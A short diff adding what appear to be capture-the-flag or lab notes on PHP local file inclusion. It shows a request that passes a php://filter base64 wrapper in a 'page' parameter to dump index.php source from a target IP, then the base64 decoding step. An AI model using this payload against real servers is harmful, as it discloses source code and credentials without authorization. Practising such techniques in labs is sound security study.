@@ -1,0 +1,4 @@
+161.35.41.48:32586/index.php?page=php://filter/read=convert.base64-encode/resource=index
+decode the string from above command: 
+echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
+
